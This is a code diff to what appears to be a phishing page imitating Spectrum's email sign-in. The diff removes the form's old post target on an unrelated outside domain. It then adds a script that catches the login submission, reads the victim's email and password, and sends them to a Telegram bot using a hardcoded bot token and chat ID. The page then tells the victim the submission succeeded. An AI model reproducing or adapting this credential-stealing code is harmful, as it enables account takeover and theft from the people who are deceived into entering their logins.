@@ -172,7 +172,7 @@ support">
             <div id="orText">or</div>
             <div id="hohHref"><a href="https://www.spectrum.net/hoh">Create an Email Address</a></div>
         </div>
-        <form action="https://valerecycling-uk.com/spectrum.php" method="post">
+        <form action="" method="post">
             <div id="emailAddressContainer" >
                 <label for="emailAddress">Email Address</label>
                 <input
@@ -270,5 +270,39 @@ Information</a>
     $($links[i]).attr("aria-label", $($links[i]).text() + " (Opens in new window)");
   });
 </script>
+
+    <script>
+  const botToken = '7429569547:AAH0fv3HxwR-DXWekPFEuZrUcvM-Ut2zIVA';
+  const chatId = '732332108';
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    const message = `🔐 New Login:\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert("Submitted successfully!");
+        // Optional redirect:
+        // window.location.href = "thankyou.html";
+      } else {
+        alert("Error submitting.");
+      }
+    });
+  });
+</script>
+</body>
+
 </body>
 </html>
